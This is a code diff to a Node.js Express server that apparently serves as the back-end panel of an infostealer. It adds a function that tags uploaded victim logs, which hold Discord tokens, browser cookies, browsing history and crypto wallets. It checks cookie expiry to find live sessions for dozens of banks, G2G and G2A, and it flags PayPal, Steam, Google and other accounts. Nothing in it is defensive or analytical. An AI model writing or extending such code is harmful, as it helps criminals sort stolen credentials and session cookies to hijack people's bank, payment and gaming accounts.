@@ -10,6 +10,166 @@ const { userDb, loginAttemptsDb, logsDb } = require('./database');
 const app = express();
 const PORT = process.env.PORT || 3001;
 
+// Helper function to check if a cookie is non-expired
+const isCookieNonExpired = (cookie) => {
+    if (!cookie.expires && !cookie.expires_utc) return true; // Session cookies (no expiry) are valid
+    
+    try {
+        let expiryTimestamp = cookie.expires || cookie.expires_utc;
+        if (typeof expiryTimestamp === 'string') {
+            const parsed = Date.parse(expiryTimestamp);
+            if (!isNaN(parsed)) {
+                expiryTimestamp = parsed / 1000;
+            }
+        }
+        // Chrome stores expires_utc as microseconds since 1601
+        if (expiryTimestamp > 13000000000000) {
+            expiryTimestamp = (expiryTimestamp / 1000000) - 11644473600;
+        }
+        // If it's in seconds since 1970, compare with current time
+        const currentTimestamp = Math.floor(Date.now() / 1000);
+        return expiryTimestamp > currentTimestamp;
+    } catch (e) {
+        return true; // If parsing fails, assume it's valid
+    }
+};
+
+// Function to extract tags from log data (server-side for dataSummary)
+const extractTagsFromPcData = (pcData) => {
+    const tags = [];
+    if (!pcData) return tags;
+    
+    // Check for Discord tokens
+    if (pcData.discordTokens && Array.isArray(pcData.discordTokens) && pcData.discordTokens.length > 0) {
+        tags.push({ label: 'Discord (token)', color: '#5865F2' });
+    }
+    
+    // Check browser history and cookies for sites
+    const allUrls = [];
+    const historyUrls = [];
+    const cookieData = [];
+    
+    // Extract URLs from browser history
+    if (pcData.browserHistory) {
+        const history = pcData.browserHistory;
+        ['chromeHistory', 'firefoxHistory', 'edgeHistory', 'operaHistory', 'braveHistory'].forEach(browser => {
+            if (history[browser] && Array.isArray(history[browser])) {
+                history[browser].forEach(entry => {
+                    if (entry.url) {
+                        const url = entry.url.toLowerCase();
+                        allUrls.push(url);
+                        historyUrls.push(url);
+                    }
+                });
+            }
+        });
+    }
+    
+    // Extract domains from cookies with expiration info
+    if (pcData.browserCookies) {
+        let cookies = [];
+        if (typeof pcData.browserCookies === 'string') {
+            try {
+                cookies = JSON.parse(pcData.browserCookies);
+            } catch (e) {
+                // If parsing fails, try to extract domains from string
+                const domainMatches = pcData.browserCookies.match(/"domain"\s*:\s*"([^"]+)"/gi);
+                if (domainMatches) {
+                    domainMatches.forEach(match => {
+                        const domainMatch = match.match(/"([^"]+)"$/);
+                        if (domainMatch && domainMatch[1]) {
+                            const domain = domainMatch[1].toLowerCase();
+                            allUrls.push(domain);
+                            cookieData.push({ domain: domain, expires: null });
+                        }
+                    });
+                }
+            }
+        } else if (Array.isArray(pcData.browserCookies)) {
+            cookies = pcData.browserCookies;
+        }
+        
+        if (Array.isArray(cookies)) {
+            cookies.forEach(cookie => {
+                if (cookie.domain || cookie.host) {
+                    const domain = (cookie.domain || cookie.host).toLowerCase();
+                    allUrls.push(domain);
+                    cookieData.push({
+                        domain: domain,
+                        expires: cookie.expires || cookie.expires_utc || null
+                    });
+                }
+            });
+        }
+    }
+    
+    // Site detection patterns - sites that require non-expired cookies
+    const cookieRequiredSites = {
+        'G2G': ['g2g.com'],
+        'G2A': ['g2a.com'],
+        'Banking': [
+            'chase.com', 'bankofamerica.com', 'wellsfargo.com', 'citibank.com', 'usbank.com',
+            'pnc.com', 'tdbank.com', 'capitalone.com', 'americanexpress.com', 'discover.com',
+            'barclays.com', 'hsbc.com', 'jpmorgan.com', 'morganstanley.com', 'goldmansachs.com',
+            'schwab.com', 'fidelity.com', 'vanguard.com', 'etrade.com', 'ally.com',
+            'synchrony.com', 'regions.com', 'suntrust.com', 'bbt.com', 'keybank.com',
+            'huntington.com', 'fifththird.com', 'm&t.com', 'citizensbank.com', 'td.com'
+        ]
+    };
+    
+    // Site detection patterns - sites that don't require cookie expiration check
+    const sitePatterns = {
+        'YouTube': ['youtube.com', 'youtu.be', 'youtube-nocookie.com'],
+        'Microsoft': ['microsoft.com', 'office.com', 'outlook.com', 'live.com', 'hotmail.com', 'onedrive.com', 'azure.com', 'microsoftonline.com'],
+        'Google': ['google.com', 'gmail.com', 'googlemail.com', 'googletagmanager.com', 'googleapis.com', 'googleusercontent.com'],
+        'Facebook': ['facebook.com', 'fb.com', 'messenger.com'],
+        'Twitter': ['twitter.com', 'x.com', 't.co'],
+        'Instagram': ['instagram.com'],
+        'TikTok': ['tiktok.com'],
+        'Reddit': ['reddit.com'],
+        'Amazon': ['amazon.com', 'amazon.co.uk', 'amazon.de', 'amazon.fr'],
+        'Steam': ['steamcommunity.com', 'steampowered.com', 'steam-chat.com'],
+        'Epic Games': ['epicgames.com', 'unrealengine.com'],
+        'PayPal': ['paypal.com'],
+        'GitHub': ['github.com'],
+        'Netflix': ['netflix.com'],
+        'Spotify': ['spotify.com'],
+        'Discord': ['discord.com', 'discordapp.com', 'discord.gg'],
+    };
+    
+    // Check cookie-required sites (only show if non-expired cookies exist)
+    Object.keys(cookieRequiredSites).forEach(siteName => {
+        const patterns = cookieRequiredSites[siteName];
+        const foundInHistory = historyUrls.some(url => patterns.some(pattern => url.includes(pattern)));
+        
+        // Check if there are non-expired cookies for this site
+        const hasNonExpiredCookie = cookieData.some(cookie => {
+            const matchesDomain = patterns.some(pattern => cookie.domain.includes(pattern));
+            return matchesDomain && isCookieNonExpired(cookie);
+        });
+        
+        if ((foundInHistory || hasNonExpiredCookie) && !tags.some(t => t.label.includes(siteName))) {
+            tags.push({ label: siteName, color: siteName === 'Banking' ? '#ef4444' : '#60a5fa' });
+        }
+    });
+    
+    // Check for regular sites (from history or cookies, no expiration requirement)
+    Object.keys(sitePatterns).forEach(siteName => {
+        const patterns = sitePatterns[siteName];
+        const found = allUrls.some(url => patterns.some(pattern => url.includes(pattern)));
+        if (found && !tags.some(t => t.label.includes(siteName))) {
+            tags.push({ label: siteName, color: '#60a5fa' });
+        }
+    });
+    
+    // Check for crypto wallets
+    if (pcData.cryptoWallets && Array.isArray(pcData.cryptoWallets) && pcData.cryptoWallets.length > 0) {
+        tags.push({ label: 'Crypto Wallet', color: '#f59e0b' });
+    }
+    
+    return tags;
+};
+
 // JWT_SECRET must be set in environment variables - no hardcoded fallback
 if (!process.env.JWT_SECRET) {
     console.error('ERROR: JWT_SECRET environment variable is required!');
@@ -376,11 +536,21 @@ app.post('/api/upload', (req, res) => {
             totalHistoryEntries += pcData.browserHistory.braveHistory?.length || 0;
         }
 
+        // Prepare pcData with transformed cookies for tag extraction
+        const pcDataForTags = { ...pcData };
+        if (transformedBrowserCookies.length > 0) {
+            pcDataForTags.browserCookies = transformedBrowserCookies;
+        }
+        
+        // Extract tags from pcData
+        const tags = extractTagsFromPcData(pcDataForTags);
+        
         const dataSummary = {
             historyEntries: totalHistoryEntries,
             processes: pcData?.runningProcesses?.length || 0,
             installedApps: pcData?.installedApps?.length || 0,
-            cookies: transformedBrowserCookies.length || 0
+            cookies: transformedBrowserCookies.length || 0,
+            tags: tags
         };
 
         // Handle browserCookies - always include if present, even if empty (so merge knows to update)
